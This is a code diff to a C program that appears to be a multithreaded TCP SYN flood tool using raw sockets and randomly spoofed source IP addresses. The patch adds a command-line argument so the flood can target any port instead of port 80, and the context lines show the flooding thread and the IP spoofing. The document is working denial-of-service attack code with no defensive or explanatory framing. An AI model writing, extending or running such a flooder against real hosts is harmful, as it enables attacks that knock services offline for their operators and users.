@@ -26,6 +26,7 @@ int max_threads;
 pthread_t *th;
 pthread_mutex_t mutex;
 int raw_socket;
+int port_number;
 char *pseudogram;
 char datagram[4096];
 char source_ip[32];
@@ -58,6 +59,11 @@ int main(int argc, char *argv[])
   }
   else if (argc < 4) {
     printf("Please provide the number of threads\n");
+    exit(EXIT_FAILURE);
+  }
+  else if (argc < 5) {
+    printf("Please provide a port number\n");
+    exit(EXIT_FAILURE);
   }
 
   max_threads = atoi(argv[3]);
@@ -69,6 +75,7 @@ int main(int argc, char *argv[])
   // raw socket
   raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
   check_socket(raw_socket);
+  port_number = atoi(argv[4]);
 
   memset(datagram, 0, sizeof(datagram));
 
@@ -110,7 +117,7 @@ void *syn_flood(void *data)
     // address resolution
     random_ip(source_ip); // spoofed IP address - ex: 192.168.1.2
     s_in.sin_family = AF_INET;
-    s_in.sin_port = htons(80); // port
+    s_in.sin_port = htons(port_number); // port
     s_in.sin_addr.s_addr = inet_addr(target_ip); // target IP
 
     // IP header
@@ -132,7 +139,7 @@ void *syn_flood(void *data)
     // TCP header
     remove_char(source_ip,'.');
     tcph->source = htons(atoi(source_ip));
-    tcph->dest = htons(80);
+    tcph->dest = htons(port_number);
     tcph->seq = 0;
     tcph->ack_seq = 0;
     tcph->doff = 5; // tcp header size
